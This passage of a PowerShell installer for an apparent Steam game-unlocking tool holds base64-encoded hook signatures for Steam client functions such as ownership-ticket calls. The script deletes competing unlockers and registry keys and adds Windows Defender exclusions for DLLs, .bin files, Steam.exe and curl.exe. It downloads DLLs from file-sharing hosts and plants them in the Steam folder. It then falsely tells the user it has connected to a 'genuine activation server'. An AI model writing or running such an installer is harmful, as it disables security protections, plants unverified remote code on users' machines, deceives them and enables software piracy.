    "pattern/steamui" = "WzB4RDA1RTI2QTJdCm5hbWUgPSAiQWRkUHJvdG9idWZBc0JpbmFyeSIKcnZhID0gIjB4MCIKc2lnID0gIjQwIDUzIDU1IDU2IDU3IDQ4IDgzIEVDIDI4IDQ4IDhCIDA1ID8/ID8/ID8/ID8/IDQ4IDhCIEYyIgoKWzB4RTIyRjc0QjRdCm5hbWUgPSAiQnVpbGRDb21wbGV0ZUFwcE92ZXJ2aWV3Q2hhbmdlIgpydmEgPSAiMHgwIgpzaWcgPSAiNEMgODkgNDQgMjQgMTggNDggODkgNTQgMjQgMTAgNDggODkgNEMgMjQgMDggNTUgNTMgNTYgNTcgNDEgNTQgNDEgNTUgNDEgNTYgNDEgNTcgNDggOEQgNkMgMjQgRTEiCgpbMHgyMjFGMDY2MV0KbmFtZSA9ICJDU3RlYW1VSUFwcENvbnRyb2xsZXJSdW5GcmFtZSIKcnZhID0gIjB4MCIKc2lnID0gIjQ4IDg5IDVDIDI0IDEwIDQ4IDg5IDZDIDI0IDE4IDU2IDU3IDQxIDU0IDQxIDU2IDQxIDU3IDQ4IDgzIEVDIDQwIDBGIDI5IDc0IDI0IDMwIgoKWzB4QjAzMEEwNjFdCm5hbWUgPSAiRmlsbEluQXBwT3ZlcnZpZXciCnJ2YSA9ICIweDAiCnNpZyA9ICI0OCA4OSA1NCAyNCAxMCA0OCA4OSA0QyAyNCAwOCA1NSA1MyA1NiA1NyA0MSA1NCA0MSA1NSA0MSA1NiA0MSA1NyA0OCA4RCA2QyAyNCBFMSA0OCA4MSBFQyBCOCAwMCAwMCAwMCIKClsweDNGQzY4NTQ2XQpuYW1lID0gIkdldEFwcEJ5SUQiCnJ2YSA9ICIweDAiCnNpZyA9ICI4OSA1NCAyNCAxMCA1MyA0OCA4MyBFQyA0MCA0OCA4QiAwNSA/PyA/PyA/PyA/PyIKClsweEM4OUNGQTc1XQpuYW1lID0gIkdldFRvcE1hbmFnZXIiCnJ2YSA9ICIweDAiCnNpZyA9ICI0OCA4QiAwNSA5OSA2NyBCMCAwMCBDMyIKClsweEJERTE2QkQ2XQpuYW1lID0gIkxvYWRNb2R1bGVXaXRoUGF0aCIKcnZhID0gIjB4MCIKc2lnID0gIjQ4IDg5IDVDIDI0IDE4IDU1IDU2IDQxIDU3IDQ4IDgzIEVDIDQwIgoKWzB4QzdENUNBQ0ZdCm5hbWUgPSAiTWFya0FwcENoYW5nZSIKcnZhID0gIjB4MCIKc2lnID0gIjQ4IDgzIEVDIDc4IDQ4IDhCIDA1ID8/ID8/ID8/ID8/IDQ4IDg5IDc0IDI0IDcwIgoKWzB4MTUzNDc5RjBdCm5hbWUgPSAiUmVwZWF0ZWRGaWVsZFVpbnQzMl9BZGQiCnJ2YSA9ICIweDAiCnNpZyA9ICI0OCA4OSA3NCAyNCAxMCA0OCA4OSA3QyAyNCAxOCA0MSA1NiA0OCA4MyBFQyAyMCA4QiAzMSA0OCA4QiBGOSA4QiA0OSAwNCIKClsweEQwNTVENkMwXQpuYW1lID0gIlNob3VsZFNob3dBcHBJbkxpYnJhcnkiCnJ2YSA9ICIweDAiCnNpZyA9ICI0MCA1MyA0OCA4MyBFQyAyMCA0OCA4QiAwMSA0OCA4QiBEOSBGRiAxMCAzRCBENiAwQyAwOSAwMCIK"
    "ipc/steamclient" = "W0lDbGllbnRVc2VyXQppbnRlcmZhY2VfaWQgPSAxCnZ0YWJsZV9ydmEgPSAiMHgxMkU2NTkwIgoKW0lDbGllbnRVc2VyLkdldFN0ZWFtSURdCm1ldGhvZF9pbmRleCA9IDEwCmZ1bmNIYXNoID0gIjB4RDZGQzMyMDAiCndyYXBwZXJfcnZhID0gIjB4NzdBRDAwIgpmZW5jZXBvc3QgPSAiMHhENzA1OENBNSIKYXJnYyA9IDAKCltJQ2xpZW50VXNlci5HZXRBcHBPd25lcnNoaXBUaWNrZXRFeHRlbmRlZERhdGFdCm1ldGhvZF9pbmRleCA9IDEwNQpmdW5jSGFzaCA9ICIweEM3RTcxMjQ1Igp3cmFwcGVyX3J2YSA9ICIweDc0MzQyMCIKZmVuY2Vwb3N0ID0gIjB4Qzg0NDk4NDAiCmFyZ2MgPSAyCgpbSUNsaWVudFVzZXIuUmVxdWVzdEVuY3J5cHRlZEFwcFRpY2tldF0KbWV0aG9kX2luZGV4ID0gMTIwCmZ1bmNIYXNoID0gIjB4MjVENkJCMUQiCndyYXBwZXJfcnZhID0gIjB4ODM4MEUwIgpmZW5jZXBvc3QgPSAiMHgyNjQ2QjY2MyIKYXJnYyA9IDIKCltJQ2xpZW50VXNlci5HZXRFbmNyeXB0ZWRBcHBUaWNrZXRdCm1ldGhvZF9pbmRleCA9IDEyMQpmdW5jSGFzaCA9ICIweEUwNDY4Q0I0Igp3cmFwcGVyX3J2YSA9ICIweDc1NjJFMCIKZmVuY2Vwb3N0ID0gIjB4RTBCODAyMDAiCmFyZ2MgPSAxCgpbSUNsaWVudFV0aWxzXQppbnRlcmZhY2VfaWQgPSA0CnZ0YWJsZV9ydmEgPSAiMHgxMkVCRkI4IgoKW0lDbGllbnRVdGlscy5HZXRBcHBJRF0KbWV0aG9kX2luZGV4ID0gMTkKZnVuY0hhc2ggPSAiMHgwOTYwN0VDNCIKd3JhcHBlcl9ydmEgPSAiMHg3NDIxODAiCmZlbmNlcG9zdCA9ICIweDBBRkU3NTUyIgphcmdjID0gMAoKW0lDbGllbnRVdGlscy5HZXRBUElDYWxsUmVzdWx0XQptZXRob2RfaW5kZXggPSAyNApmdW5jSGFzaCA9ICIweDJEM0QzOTQ3Igp3cmFwcGVyX3J2YSA9ICIweDczREZDMCIKZmVuY2Vwb3N0ID0gIjB4MkVERjVFRTYiCmFyZ2MgPSAzCg=="
}

function Write-EmbeddedSigCache {
    param(
        [string]$Channel,
        [string]$Component,
        [string]$Sha,
        [string]$Dest,
        [switch]$ExactOnly
    )
    $b64 = $null
    $exactKey = "$Channel/$Component/$Sha"
    if ($script:SigEmbedExact -and $script:SigEmbedExact.ContainsKey($exactKey)) {
        $b64 = [string]$script:SigEmbedExact[$exactKey]
    } elseif (-not $ExactOnly) {
        $fbKey = "$Channel/$Component"
        if ($script:SigEmbedFallback -and $script:SigEmbedFallback.ContainsKey($fbKey)) {
            $b64 = [string]$script:SigEmbedFallback[$fbKey]
        }
    }
    if ([string]::IsNullOrWhiteSpace($b64)) { return $false }
    try {
        $text = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b64))
        if ($text.Length -lt 40) { return $false }
        [IO.File]::WriteAllText($Dest, $text)
        return $true
    } catch { return $false }
}

function ConvertTo-SigOnlyText([string]$Text) {
    if ([string]::IsNullOrEmpty($Text)) { return $Text }
    # Force every pattern `rva = "..."` to 0x0. Anchored at line start so it only
    # touches bare `rva =` (pattern tables); ipc `wrapper_rva`/`vtable_rva` start with
    # "wrapper_"/"vtable_" and are left intact (ipc matches by funcHash, not RVA).
    return [regex]::Replace($Text, '(?m)^(\s*rva\s*=\s*)"[^"]*"', '${1}"0x0"')
}

function Save-SigCache {
    param(
        [string]$DllPath,
        [string]$Channel,
        [string]$Component
    )
    if (-not (Test-Path $DllPath)) { return $false }
    try {
        $sha = (Get-FileHash -Algorithm SHA256 -Path $DllPath).Hash.ToLower()
    } catch {
        return $false
    }
    if (-not $sha) { return $false }

    $cacheDir = Join-Path $env:LOCALAPPDATA "SDL3\cache\$Channel\$Component"
    if (-not (Test-Path $cacheDir)) {
        New-Item -ItemType Directory -Force -Path $cacheDir | Out-Null
    }
    $dest = Join-Path $cacheDir "$sha.toml"

    function Test-TomlLooksValid([string]$Path, [string]$Ch) {
        if (-not (Test-Path $Path)) { return $false }
        try {
            $len = (Get-Item $Path).Length
            if ($len -lt 40) { return $false }
            $head = Get-Content -Path $Path -TotalCount 40 -ErrorAction Stop | Out-String
            if ($Ch -eq "ipc") {
                return ($head -match "IClient|funcHash|interface_id")
            }
            return ($head -match "name\s*=|rva\s*=|sig\s*=")
        } catch { return $false }
    }

    if (Test-TomlLooksValid -Path $dest -Ch $Channel) {
        return $true
    }
    Remove-Item $dest -Force -ErrorAction SilentlyContinue

    $urls = @(
        "$SigBaseUrl/pattern/$Channel/$Component/$sha.toml",
        "https://cdn.jsdelivr.net/gh/OpenSteam001/steam-monitor@$Channel/$Component/$sha.toml",
        "https://raw.githubusercontent.com/OpenSteam001/steam-monitor/$Channel/$Component/$sha.toml"
    )

    function Get-UrlToFile([string]$Url, [string]$OutFile) {
        $curl = Get-Command "curl.exe" -ErrorAction SilentlyContinue
        if ($curl) {
            try {
                & curl.exe --ssl-no-revoke -fsSL --connect-timeout 10 --max-time 25 -A "csu-install/1.0" -o $OutFile $Url 2>$null
                if ($LASTEXITCODE -eq 0 -and (Test-Path $OutFile) -and ((Get-Item $OutFile).Length -gt 0)) {
                    return $true
                }
            } catch {}
            Remove-Item $OutFile -Force -ErrorAction SilentlyContinue
        }
        try {
            Invoke-WebRequest -Uri $Url -OutFile $OutFile -UseBasicParsing -TimeoutSec 25
            if ((Test-Path $OutFile) -and ((Get-Item $OutFile).Length -gt 0)) { return $true }
        } catch {}
        Remove-Item $OutFile -Force -ErrorAction SilentlyContinue
        return $false
    }

    foreach ($url in $urls) {
        if (Get-UrlToFile -Url $url -OutFile $dest) {
            if (Test-TomlLooksValid -Path $dest -Ch $Channel) { return $true }
            Remove-Item $dest -Force -ErrorAction SilentlyContinue
        }
    }

    if (Write-EmbeddedSigCache -Channel $Channel -Component $Component -Sha $sha -Dest $dest -ExactOnly) {
        if (Test-TomlLooksValid -Path $dest -Ch $Channel) { return $true }
        Remove-Item $dest -Force -ErrorAction SilentlyContinue
    }

    if ($Channel -eq "ipc") {
        $fallbackUrls = @(
            "$SigBaseUrl/pattern/ipc/steamclient/latest.toml",
            "$SigBaseUrl/pattern/ipc/steamclient/$sha.toml"
        )
        foreach ($url in $fallbackUrls) {
            if (Get-UrlToFile -Url $url -OutFile $dest) {
                if (Test-TomlLooksValid -Path $dest -Ch $Channel) {
                    return $true
                }
                Remove-Item $dest -Force -ErrorAction SilentlyContinue
            }
        }
    }

    $tomlKey = "$Channel/$Component"
    if ($LanzouTomlShares -and $LanzouTomlShares.ContainsKey($tomlKey)) {
        $share = $LanzouTomlShares[$tomlKey]
        $shareUrl = [string]$share.url
        if (-not [string]::IsNullOrWhiteSpace($shareUrl)) {
            $direct = $null
            try {
                $direct = Resolve-LanzouDirectUrl -ShareUrl $shareUrl -Pwd ([string]$share.pwd)
            } catch {}
            if ($direct) {
                $inner = [string]$share.inner
                $tmpDl = Join-Path $env:TEMP ("sdl3_sig_" + $Channel + "_" + $Component + ".bin")
                Remove-Item $tmpDl -Force -ErrorAction SilentlyContinue
                if (Get-UrlToFile -Url $direct -OutFile $tmpDl) {
                    $body = $null
                    if (-not [string]::IsNullOrWhiteSpace($inner)) {
                        try {
                            Add-Type -AssemblyName System.IO.Compression.FileSystem -ErrorAction SilentlyContinue
                            $zip = [System.IO.Compression.ZipFile]::OpenRead($tmpDl)
                            try {
                                $entry = $zip.Entries | Where-Object { $_.FullName -eq $inner -or $_.Name -eq $inner } | Select-Object -First 1
                                if ($entry) {
                                    $sr = New-Object System.IO.StreamReader($entry.Open())
                                    try { $body = $sr.ReadToEnd() } finally { $sr.Close() }
                                }
                            } finally { $zip.Dispose() }
                        } catch {}
                    }
                    if ([string]::IsNullOrWhiteSpace($body)) {
                        try { $body = [IO.File]::ReadAllText($tmpDl) } catch { $body = $null }
                    }
                    Remove-Item $tmpDl -Force -ErrorAction SilentlyContinue
                    if ($body -and $body.Length -gt 40) {
                        # 蓝奏兜底是【固定表】、不随本机 SHA 变化：pattern 通道一律降级 sig-only
                        # (rva=0x0)，绝不把带旧 RVA 的精确表写成新 SHA 名——否则 PatternLoader
                        # 直接信 RVA、按错地址 hook → 登录后崩（阵秋机根因）。ipc 只用 funcHash，原样。
                        if ($Channel -eq "pattern") { $body = ConvertTo-SigOnlyText $body }
                        try { [IO.File]::WriteAllText($dest, $body) } catch {}
                        if (Test-TomlLooksValid -Path $dest -Ch $Channel) {
                            return $true
                        }
                        Remove-Item $dest -Force -ErrorAction SilentlyContinue
                    }
                }
            }
        }
    }


    if (Write-EmbeddedSigCache -Channel $Channel -Component $Component -Sha $sha -Dest $dest) {
        if (Test-TomlLooksValid -Path $dest -Ch $Channel) { return $true }
        Remove-Item $dest -Force -ErrorAction SilentlyContinue
    }

    return $false
}

function Test-FileContainsAscii([string]$Path, [string]$Needle) {
    if (-not (Test-Path -LiteralPath $Path)) { return $false }
    try {
        $fs = [System.IO.File]::Open($Path, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
        try {
            $len = [int][Math]::Min($fs.Length, 8MB)
            if ($len -lt $Needle.Length) { return $false }
            $buf = New-Object byte[] $len
            [void]$fs.Read($buf, 0, $len)
            $text = [System.Text.Encoding]::ASCII.GetString($buf)
            return ($text.IndexOf($Needle, [StringComparison]::Ordinal) -ge 0)
        } finally { $fs.Close() }
    } catch { return $false }
}

function Test-IsOurComponent([string]$Path, [string]$DllName) {
    if (-not (Test-Path -LiteralPath $Path)) { return $false }
    $len = 0L
    try {
        $fi = Get-Item -LiteralPath $Path -Force
        $len = [int64]$fi.Length
        if ($len -lt 1024) { return $false }
        $fs = [System.IO.File]::Open($Path, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
        try {
            $hdr = New-Object byte[] 2
            if ($fs.Read($hdr, 0, 2) -ne 2) { return $false }
            if ($hdr[0] -ne 0x4D -or $hdr[1] -ne 0x5A) { return $false }
        } finally { $fs.Close() }
    } catch { return $false }
    if ($DllName -eq "version.dll") {
        return (Test-FileContainsAscii -Path $Path -Needle "CSU_DIVA_HOST")
    }
    $hasVoder = Test-FileContainsAscii -Path $Path -Needle "SDL3_voder"
    if ($DllName -eq "SDL3_voder.dll") {
        if ($len -lt 200KB) { return $false }
        return $hasVoder
    }
    if ($hasVoder) { return $true }
    if (Test-FileContainsAscii -Path $Path -Needle "diversion") { return $false }
    return $false
}

function Remove-SteamRootVersionDll([string]$SteamPath) {
    $p = Join-Path $SteamPath "version.dll"
    if (-not (Test-Path -LiteralPath $p)) { return $true }
    for ($i = 0; $i -lt 6; $i++) {
        try { cmd /c "attrib -R -S -H `"$p`"" | Out-Null } catch {}
        try {
            $fi = Get-Item -LiteralPath $p -Force
            if ($fi.IsReadOnly) { $fi.IsReadOnly = $false }
            Remove-Item -LiteralPath $p -Force -ErrorAction Stop
        } catch {}
        if (-not (Test-Path -LiteralPath $p)) { return $true }
        try { cmd /c "takeown /f `"$p`" /a" | Out-Null } catch {}
        try { cmd /c "icacls `"$p`" /grant Administrators:F /q" | Out-Null } catch {}
        Start-Sleep -Milliseconds 400
    }
    return -not (Test-Path -LiteralPath $p)
}

function Clear-ReadOnlyThenRemove([string]$Path) {
    if (-not (Test-Path -LiteralPath $Path)) { return }
    try {
        $fi = Get-Item -LiteralPath $Path -Force
        if ($fi.PSIsContainer) {
            Get-ChildItem -LiteralPath $Path -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object {
                try { if (-not $_.PSIsContainer -and $_.IsReadOnly) { $_.IsReadOnly = $false } } catch {}
            }
        } elseif ($fi.IsReadOnly) {
            $fi.IsReadOnly = $false
        }
        Remove-Item -LiteralPath $Path -Force -Recurse -ErrorAction Stop
    } catch {}
}

function Remove-RivalResidues([string]$SteamPath) {
    $left = @()
    $items = @(
        "SDL3_voder.dll", "xinput1_4.dll", "dwmapi.dll", "version.dll",
        "versions.dll", "hid.dll", "core.dll", "user32.dll", "diversion.dll",
        "winmm.dll", "zlib1.dll", "7z.dll", "OpenSteamTool.dll",
        "steamclient_loader.dll", "GameOverlayRenderer64.bak", "xinput9_1_0.dll",
        "dinput8.dll", "msimg32.dll", "dbghelp.dll",
        "Core", "CoreBeta", "diversion",
        "bin\diversion.dll", "bin\diversion",
        "steam.cfg", "cons", "cdk.exe", "f1.exe", "steam_emu.ini", "emu.cfg", "local.vdf.bak",
        "package\beta", "config\stplug-in", "config\stUI", "config\steamunlocked", "config\greenluma"
    )
    foreach ($rf in $items) {
        $p = Join-Path $SteamPath $rf
        Clear-ReadOnlyThenRemove $p
        if (Test-Path -LiteralPath $p) { $left += $rf }
    }
    $cfgDir = Join-Path $SteamPath "config"
    if (Test-Path -LiteralPath $cfgDir) {
        foreach ($abc in @(Get-ChildItem -LiteralPath $cfgDir -Filter "*.abc" -File -ErrorAction SilentlyContinue)) {
            Clear-ReadOnlyThenRemove $abc.FullName
            if (Test-Path -LiteralPath $abc.FullName) { $left += ("config\" + $abc.Name) }
        }
    }
    foreach ($rk in @(
        "HKCU:\Software\SteamTools",
        "HKLM:\Software\SteamTools",
        "HKCU:\Software\Valve\Steamtools",
        "HKLM:\Software\Valve\Steamtools"
    )) {
        if (Test-Path $rk) {
            try { Remove-Item -Path $rk -Recurse -Force -ErrorAction Stop } catch {}
            if (Test-Path $rk) { $left += $rk }
        }
    }
    try {
        $steamUserReg = "HKCU:\Software\Valve\Steam"
        if (Test-Path $steamUserReg) {
            Remove-ItemProperty -Path $steamUserReg -Name "AutoLoginUser" -ErrorAction SilentlyContinue
        }
    } catch {}
    return $left
}

Write-Host "正在网络初始化中..." -ForegroundColor Cyan
Show-SetupProgress 5 "定位 Steam"

$SteamPath = Find-SteamPath
if (-not $SteamPath) {
    Write-Err "no steam"
    Close-Window
}
Show-SetupProgress 10 "关闭 Steam"

$steamProcs = Get-Process -Name "steam", "steamwebhelper", "steamservice" -ErrorAction SilentlyContinue
if ($steamProcs) {
    try { Start-Process -FilePath "$SteamPath\Steam.exe" -ArgumentList "-shutdown" -ErrorAction SilentlyContinue } catch {}
    $deadline = (Get-Date).AddSeconds(15)
    while ((Get-Date) -lt $deadline -and (Get-Process -Name "steam" -ErrorAction SilentlyContinue)) {
        Start-Sleep -Milliseconds 500
    }
    Get-Process -Name "steam", "steamwebhelper", "steamservice" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2
}
Show-SetupProgress 18 "清理残留"

$rivalLeft = @(Remove-RivalResidues -SteamPath $SteamPath)
if (-not (Remove-SteamRootVersionDll -SteamPath $SteamPath)) {
    Write-Err "version.dll locked"
    Close-Window
}
$rivalLeft = @($rivalLeft | Where-Object { $_ -ne "version.dll" })
if ($rivalLeft.Count -gt 0) {
    Write-Err ("rival locked " + ($rivalLeft -join ","))
    Close-Window
}
$locked = @()
foreach ($dll in $dlls) {
    $p = Join-Path $SteamPath $dll
    if (Test-Path -LiteralPath $p) {
        try {
            $fi = Get-Item -LiteralPath $p -Force
            if ($fi.IsReadOnly) { $fi.IsReadOnly = $false }
            Remove-Item -LiteralPath $p -Force -ErrorAction Stop
        } catch {}
    }
    if (Test-Path -LiteralPath $p) { $locked += $dll }
}
if ($locked.Count -gt 0) {
    Write-Err ("locked " + ($locked -join ","))
    Close-Window
}

New-Item -ItemType Directory -Force -Path $TmpDir | Out-Null
try {
    $defJob = Start-Job -ScriptBlock {
        param($SteamPath, $TmpDir, $dlls)
        try {
            foreach ($dll in $dlls) { Add-MpPreference -ExclusionPath "$SteamPath\$dll" -ErrorAction SilentlyContinue }
            Add-MpPreference -ExclusionPath $TmpDir -ErrorAction SilentlyContinue
            Add-MpPreference -ExclusionExtension "bin" -ErrorAction SilentlyContinue
            Add-MpPreference -ExclusionProcess "Steam.exe" -ErrorAction SilentlyContinue
            Add-MpPreference -ExclusionProcess "curl.exe" -ErrorAction SilentlyContinue
        } catch {}
    } -ArgumentList $SteamPath, $TmpDir, $dlls
    if (-not (Wait-Job $defJob -Timeout 12)) { Stop-Job $defJob -ErrorAction SilentlyContinue }
    Remove-Job $defJob -Force -ErrorAction SilentlyContinue
} catch {}
Show-SetupProgress 28

$deployed = 0
$failed = @()
$compIdx = 0
$lanzouMiss = @()
$forceWss = $false
foreach ($dll in $dlls) {
    $compIdx++
    Show-SetupProgress (28 + [int]((($compIdx - 1) * 62) / $dlls.Count))
    $targetPath = Join-Path $SteamPath $dll
    if (Test-Path -LiteralPath $targetPath) {
        try {
            $fileInfo = Get-Item -LiteralPath $targetPath -Force
            if ($fileInfo.IsReadOnly) { $fileInfo.IsReadOnly = $false }
            Remove-Item -LiteralPath $targetPath -Force -ErrorAction Stop
        } catch {}
    }
    if (Test-Path -LiteralPath $targetPath) {
        $failed += ($dll + " locked")
        continue
    }
    $alias = $dllAlias[$dll]
    if (-not $alias) { $alias = "comp$compIdx" }
    if ($forceWss) {
        $lanzouMiss += $dll
        continue
    }
    $tmpBin = Join-Path $TmpDir ($alias + ".bin")
    if (Download-Component -DllName $dll -OutFile $tmpBin) {
        try {
            Copy-Item -Force $tmpBin $targetPath -ErrorAction Stop
            $deployed++
        } catch {
            $failed += ($dll + " copy")
            continue
        }
    } else {
        $lanzouMiss += $dll
    }
}

if (($lanzouMiss.Count -gt 0 -or $deployed -ne $dlls.Count) -and ($failed -notcontains ($dlls[0] + " locked"))) {
    $wsDir = Join-Path $TmpDir "wenshushu_extract"
    if (Download-WenshushuZipBundle -ExtractDir $wsDir) {
        foreach ($dll in $dlls) {
            $targetPath = Join-Path $SteamPath $dll
            if (Test-Path -LiteralPath $targetPath) { continue }
            $hit = Get-ChildItem -Path $wsDir -Recurse -File -ErrorAction SilentlyContinue |
                Where-Object { $_.Name -ieq $dll } | Select-Object -First 1
            if ($hit) {
                try {
                    Copy-Item -Force $hit.FullName $targetPath -ErrorAction Stop
                    $deployed++
                    $lanzouMiss = @($lanzouMiss | Where-Object { $_ -ne $dll })
                } catch {
                    $failed += ($dll + " wenshushu copy")
                }
            } else {
                $failed += ($dll + " wenshushu missing")
            }
        }
    } else {
        $why = [string]$script:WssFailReason
        if ([string]::IsNullOrWhiteSpace($why)) { $why = "unavailable" }
        foreach ($dll in $lanzouMiss) {
            $failed += ($dll + " lanzou failed after " + [string]$LanzouDllMaxAttempts + " attempts; wenshushu " + $why)
        }
    }
}

if ($failed.Count -gt 0 -or $deployed -ne $dlls.Count) {
    Write-Err ($failed -join "; ")
    Remove-Item -Path $TmpDir -Recurse -Force -ErrorAction SilentlyContinue
    Close-Window
}

$steamclientDll = Join-Path $SteamPath "steamclient64.dll"
$steamuiDll     = Join-Path $SteamPath "steamui.dll"
Show-SetupProgress 92 "预置签名"
[void](Save-SigCache -DllPath $steamclientDll -Channel "pattern" -Component "steamclient")
[void](Save-SigCache -DllPath $steamclientDll -Channel "ipc"     -Component "steamclient")
[void](Save-SigCache -DllPath $steamuiDll     -Channel "pattern" -Component "steamui")

foreach ($dir in @("$SteamPath\config\lua", "$SteamPath\config\stplug-in")) {
    if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Force -Path $dir | Out-Null }
}

Remove-Item -Path $TmpDir -Recurse -Force -ErrorAction SilentlyContinue
if (-not (Remove-SteamRootVersionDll -SteamPath $SteamPath)) {
    Write-Err "version.dll locked"
    Close-Window
}
try { Start-Process -FilePath "$SteamPath\Steam.exe" } catch {}

Show-SetupProgress 100
Hide-SetupProgress
Write-Host "正在网络初始化中..." -ForegroundColor Cyan
Write-Host "[已成功连接正版激活服务器，请登录Steam来激活]" -ForegroundColor Green
Write-Host "[本窗口将在 5 秒后关闭...]" -ForegroundColor DarkGray
Close-Window -Delay 5
